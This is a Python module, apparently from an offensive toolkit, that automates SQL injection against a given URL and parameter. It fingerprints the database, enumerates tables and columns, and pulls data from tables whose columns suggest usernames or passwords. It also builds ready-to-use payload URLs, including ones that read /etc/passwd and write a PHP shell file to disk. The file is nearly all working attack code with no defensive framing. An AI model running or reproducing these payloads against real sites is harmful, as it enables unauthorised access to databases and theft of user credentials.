"""
SQL Injection Exploiter Module
"""

import re
import time
import requests
from urllib.parse import urlparse, parse_qs, urlunparse
from utils.logger import setup_logger

class SQLExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.logger = setup_logger()
        
        # Database fingerprinting patterns
        self.db_patterns = {
            'mysql': [
                r"mysql_fetch", r"mysql_num_rows", r"MySQLSyntaxErrorException",
                r"com.mysql.jdbc", r"Warning: mysql_", r"MySQL server error"
            ],
            'postgresql': [
                r"PostgreSQL query failed", r"pg_query", r"pg_",
                r"org.postgresql", r"PG::SyntaxError", r"valid PostgreSQL"
            ],
            'mssql': [
                r"Microsoft OLE DB Provider", r"ODBC Microsoft Access",
                r"Microsoft SQL Server", r"System.Data.SqlClient",
                r"Unclosed quotation mark", r"Incorrect syntax near"
            ],
            'oracle': [
                r"ORA-", r"Oracle error", r"Oracle Database",
                r"java.sql.SQLException: ORA"
            ],
            'sqlite': [
                r"SQLite.Exception", r"SQLite/JDBCDriver",
                r"System.Data.SQLite", r"Warning: sqlite_"
            ]
        }
        
        # Common injection payloads for exploitation
        self.exploitation_payloads = {
            'mysql': {
                'version': "' UNION SELECT @@version--",
                'database': "' UNION SELECT database()--",
                'user': "' UNION SELECT user()--",
                'tables': "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
                'columns': "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='%s'--",
                'data': "' UNION SELECT %s FROM %s--"
            },
            'postgresql': {
                'version': "' UNION SELECT version()--",
                'database': "' UNION SELECT current_database()--",
                'user': "' UNION SELECT current_user--",
                'tables': "' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--",
                'columns': "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='%s'--",
                'data': "' UNION SELECT %s FROM %s--"
            },
            'mssql': {
                'version': "' UNION SELECT @@version--",
                'database': "' UNION SELECT DB_NAME()--",
                'user': "' UNION SELECT USER_NAME()--",
                'tables': "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                'columns': "' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('%s')--",
                'data': "' UNION SELECT %s FROM %s--"
            }
        }
    
    def exploit(self, vulnerability, mutate=False, mutator=None):
        """Exploit SQL injection vulnerability"""
        try:
            url = vulnerability['url']
            param = vulnerability['parameter']
            method = vulnerability['method']
            payload_type = vulnerability['type']
            
            # Step 1: Fingerprint database
            db_type = self._fingerprint_database(vulnerability)
            if not db_type:
                self.logger.warning("Could not fingerprint database type")
                return None
            
            self.logger.info(f"[*] Detected database type: {db_type}")
            
            # Step 2: Get basic database information
            db_info = self._get_database_info(vulnerability, db_type)
            if not db_info:
                self.logger.warning("Could not extract database information")
                return None
            
            result = {
                'db_type': db_type,
                'db_info': db_info,
                'tables': [],
                'columns': {},
                'data': {},
                'injection_payloads': []  # Add this for ready-to-use payloads
            }
            
            # Step 3: Enumerate tables
            tables = self._enumerate_tables(vulnerability, db_type)
            if tables:
                result['tables'] = tables
                self.logger.info(f"[+] Found {len(tables)} tables")
                
                # Step 4: For each table, enumerate columns
                for table in tables[:5]:  # Limit to first 5 tables for demo
                    columns = self._enumerate_columns(vulnerability, db_type, table)
                    if columns:
                        result['columns'][table] = columns
                        self.logger.info(f"[+] Found {len(columns)} columns in table {table}")
                        
                        # Step 5: Extract data from interesting tables
                        if any(col.lower() in [c.lower() for c in columns] for col in ['user', 'pass', 'admin', 'login']):
                            data = self._extract_data(vulnerability, db_type, table, columns[:3])
                            if data:
                                result['data'][table] = data
            
            # Step 6: Generate ready-to-use injection payloads
            result['injection_payloads'] = self._generate_injection_payloads(
                vulnerability, db_type, result
            )
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error during exploitation: {str(e)}")
            return None
    
    def _generate_injection_payloads(self, vulnerability, db_type, result):
        """Generate ready-to-use SQL injection payloads"""
        payloads = []
        param = vulnerability['parameter']
        method = vulnerability['method']
        base_url = vulnerability['url']
        
        try:
            # Basic info extraction payloads
            if db_type == 'mysql':
                payloads.extend([
                    {
                        'type': 'Database Version',
                        'payload': f"' UNION SELECT @@version,2,3--",
                        'description': 'Extract MySQL version',
                        'url': self._build_url(base_url, param, f"' UNION SELECT @@version,2,3--", method)
                    },
                    {
                        'type': 'Current Database',
                        'payload': f"' UNION SELECT database(),2,3--",
                        'description': 'Extract current database name',
                        'url': self._build_url(base_url, param, f"' UNION SELECT database(),2,3--", method)
                    },
                    {
                        'type': 'Current User',
                        'payload': f"' UNION SELECT user(),2,3--",
                        'description': 'Extract current database user',
                        'url': self._build_url(base_url, param, f"' UNION SELECT user(),2,3--", method)
                    }
                ])
                
                # Table enumeration payload
                if result['tables']:
                    table_payload = f"' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--"
                    payloads.append({
                        'type': 'Table Enumeration',
                        'payload': table_payload,
                        'description': 'Extract all table names',
                        'url': self._build_url(base_url, param, table_payload, method)
                    })
                
                # Data extraction payloads for interesting tables
                for table in result['tables'][:3]:  # Limit to first 3 tables
                    if table in result['columns']:
                        columns = result['columns'][table][:3]  # First 3 columns
                        columns_str = ','.join(columns)
                        
                        data_payload = f"' UNION SELECT {columns_str} FROM {table}--"
                        payloads.append({
                            'type': f'Data Extraction - {table}',
                            'payload': data_payload,
                            'description': f'Extract data from {table} table',
                            'url': self._build_url(base_url, param, data_payload, method),
                            'columns': columns
                        })
                
                # Advanced payloads
                payloads.extend([
                    {
                        'type': 'File Read (if allowed)',
                        'payload': f"' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
                        'description': 'Attempt to read system files',
                        'url': self._build_url(base_url, param, f"' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--", method)
                    },
                    {
                        'type': 'Shell Command (if allowed)',
                        'payload': f"' UNION SELECT 'shell_exec',2,3 INTO OUTFILE '/tmp/shell.php'--",
                        'description': 'Attempt to write PHP shell',
                        'url': self._build_url(base_url, param, f"' UNION SELECT 'shell_exec',2,3 INTO OUTFILE '/tmp/shell.php'--", method)
                    }
                ])
                
            elif db_type == 'postgresql':
                payloads.extend([
                    {
                        'type': 'Database Version',
                        'payload': f"' UNION SELECT version(),2,3--",
                        'description': 'Extract PostgreSQL version',
                        'url': self._build_url(base_url, param, f"' UNION SELECT version(),2,3--", method)
                    },
                    {
                        'type': 'Current Database',
                        'payload': f"' UNION SELECT current_database(),2,3--",
                        'description': 'Extract current database name',
                        'url': self._build_url(base_url, param, f"' UNION SELECT current_database(),2,3--", method)
                    },
                    {
                        'type': 'Current User',
                        'payload': f"' UNION SELECT current_user,2,3--",
                        'description': 'Extract current database user',
                        'url': self._build_url(base_url, param, f"' UNION SELECT current_user,2,3--", method)
                    }
                ])
                
            elif db_type == 'mssql':
                payloads.extend([
                    {
                        'type': 'Database Version',
                        'payload': f"' UNION SELECT @@version,2,3--",
                        'description': 'Extract MSSQL version',
                        'url': self._build_url(base_url, param, f"' UNION SELECT @@version,2,3--", method)
                    },
                    {
                        'type': 'Current Database',
                        'payload': f"' UNION SELECT DB_NAME(),2,3--",
                        'description': 'Extract current database name',
                        'url': self._build_url(base_url, param, f"' UNION SELECT DB_NAME(),2,3--", method)
                    },
                    {
                        'type': 'Current User',
                        'payload': f"' UNION SELECT USER_NAME(),2,3--",
                        'description': 'Extract current database user',
                        'url': self._build_url(base_url, param, f"' UNION SELECT USER_NAME(),2,3--", method)
                    }
                ])
            
            # Add generic payloads that work on most databases
            payloads.extend([
                {
                    'type': 'Blind SQLi - True Condition',
                    'payload': f"' AND 1=1--",
                    'description': 'Test blind SQL injection with true condition',
                    'url': self._build_url(base_url, param, f"' AND 1=1--", method)
                },
                {
                    'type': 'Blind SQLi - False Condition',
                    'payload': f"' AND 1=2--",
                    'description': 'Test blind SQL injection with false condition',
                    'url': self._build_url(base_url, param, f"' AND 1=2--", method)
                },
                {
                    'type': 'Time-Based Delay',
                    'payload': f"' AND SLEEP(5)--",
                    'description': 'Test time-based SQL injection with 5 second delay',
                    'url': self._build_url(base_url, param, f"' AND SLEEP(5)--", method)
                }
            ])
            
            return payloads
            
        except Exception as e:
            self.logger.error(f"Error generating payloads: {str(e)}")
            return []
    
    def _build_url(self, base_url, param, payload, method):
        """Build complete URL with injected payload"""
        if method == 'GET':
            from urllib.parse import urlparse, parse_qs, urlunparse
            
            parsed = urlparse(base_url)
            query_params = parse_qs(parsed.query)
            query_params[param] = [payload]
            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
            
            return urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
        else:
            return f"POST {base_url} with {param}={payload}"
    
    def _fingerprint_database(self, vulnerability):
        try:
            # Test with database-specific payloads
            test_payloads = {
                'mysql': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                'postgresql': "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
                'mssql': "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
                'sqlite': "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
            }
            
            for db_type, payload in test_payloads.items():
                if self._test_payload(vulnerability, payload):
                    return db_type
            
            # Try to identify from error messages
            error_response = self._trigger_error(vulnerability)
            if error_response:
                response_text = error_response.text.lower()
                for db_type, patterns in self.db_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            return db_type
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error fingerprinting database: {str(e)}")
            return None
    
    def _get_database_info(self, vulnerability, db_type):
        """Get basic database information"""
        try:
            info = {}
            payloads = self.exploitation_payloads.get(db_type, {})
            
            # Get version
            if 'version' in payloads:
                version = self._extract_single_value(vulnerability, payloads['version'])
                if version:
                    info['version'] = version
            
            # Get database name
            if 'database' in payloads:
                database = self._extract_single_value(vulnerability, payloads['database'])
                if database:
                    info['database'] = database
            
            # Get current user
            if 'user' in payloads:
                user = self._extract_single_value(vulnerability, payloads['user'])
                if user:
                    info['current_user'] = user
            
            return info if info else None
            
        except Exception as e:
            self.logger.error(f"Error getting database info: {str(e)}")
            return None
    
    def _enumerate_tables(self, vulnerability, db_type):
        """Enumerate database tables"""
        try:
            tables = []
            payload = self.exploitation_payloads.get(db_type, {}).get('tables')
            
            if not payload:
                return tables
            
            # Modify payload to extract all tables
            if db_type == 'mysql':
                payload = "' UNION SELECT CONCAT(table_name,':',table_schema) FROM information_schema.tables--"
            elif db_type == 'postgresql':
                payload = "' UNION SELECT CONCAT(tablename,':',schemaname) FROM pg_tables--"
            elif db_type == 'mssql':
                payload = "' UNION SELECT CONCAT(name,':',SCHEMA_NAME(schema_id)) FROM sys.tables--"
            
            response = self._inject_payload(vulnerability, payload)
            if response:
                # Parse table names from response
                content = response.text
                # Look for table names in the response
                table_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)'
                matches = re.findall(table_pattern, content)
                
                # Filter out common words and keep likely table names
                common_words = ['div', 'span', 'class', 'style', 'http', 'www', 'com', 'html', 'body']
                tables = [match for match in matches if match not in common_words and len(match) > 2]
                
                # Remove duplicates
                tables = list(set(tables))
            
            return tables[:20]  # Limit to 20 tables
            
        except Exception as e:
            self.logger.error(f"Error enumerating tables: {str(e)}")
            return []
    
    def _enumerate_columns(self, vulnerability, db_type, table):
        """Enumerate columns for a specific table"""
        try:
            columns = []
            payload_template = self.exploitation_payloads.get(db_type, {}).get('columns')
            
            if not payload_template:
                return columns
            
            payload = payload_template % table
            response = self._inject_payload(vulnerability, payload)
            
            if response:
                # Parse column names from response
                content = response.text
                column_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)'
                matches = re.findall(column_pattern, content)
                
                # Filter out common words and keep likely column names
                common_words = ['div', 'span', 'class', 'style', 'http', 'www', 'com', 'html', 'body']
                columns = [match for match in matches if match not in common_words and len(match) > 2]
                
                # Remove duplicates
                columns = list(set(columns))
            
            return columns[:10]  # Limit to 10 columns
            
        except Exception as e:
            self.logger.error(f"Error enumerating columns for table {table}: {str(e)}")
            return []
    
    def _extract_data(self, vulnerability, db_type, table, columns):
        """Extract data from table"""
        try:
            data = []
            payload_template = self.exploitation_payloads.get(db_type, {}).get('data')
            
            if not payload_template:
                return data
            
            columns_str = ','.join(columns)
            payload = payload_template % (columns_str, table)
            
            response = self._inject_payload(vulnerability, payload)
            if response:
                # Parse data from response (simplified parsing)
                content = response.text
                # Look for data patterns (this is a simplified approach)
                lines = content.split('\n')
                for line in lines:
                    if any(str(col).lower() in line.lower() for col in columns):
                        # Extract potential data from this line
                        data.append(line.strip())
            
            return data[:10]  # Limit to 10 records
            
        except Exception as e:
            self.logger.error(f"Error extracting data from table {table}: {str(e)}")
            return []
    
    def _extract_single_value(self, vulnerability, payload):
        """Extract single value from response"""
        try:
            response = self._inject_payload(vulnerability, payload)
            if response:
                content = response.text
                # Look for version patterns, database names, etc.
                patterns = [
                    r'(\d+\.\d+\.\d+)',  # Version numbers
                    r'([a-zA-Z_][a-zA-Z0-9_]*)',  # Database names
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, content)
                    if matches:
                        return matches[0]
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error extracting single value: {str(e)}")
            return None
    
    def _test_payload(self, vulnerability, payload):
        """Test if payload works"""
        try:
            response = self._inject_payload(vulnerability, payload)
            return response is not None
        except:
            return False
    
    def _trigger_error(self, vulnerability):
        """Trigger SQL error to get database information"""
        try:
            error_payload = "' AND 1=CONVERT(int,(SELECT version()))--"
            return self._inject_payload(vulnerability, error_payload)
        except:
            return None
    
    def _inject_payload(self, vulnerability, payload):
        """Inject payload and get response"""
        try:
            url = vulnerability['url']
            param = vulnerability['parameter']
            method = vulnerability['method']
            
            if method == 'GET':
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[param] = [payload]
                new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                return self.session.get(new_url, timeout=10)
            else:
                # For POST requests, we need the original data
                # This is simplified - in real implementation we'd need to preserve other parameters
                data = {param: payload}
                return self.session.post(url, data=data, timeout=10)
                
        except Exception as e:
            self.logger.error(f"Error injecting payload: {str(e)}")
            return None
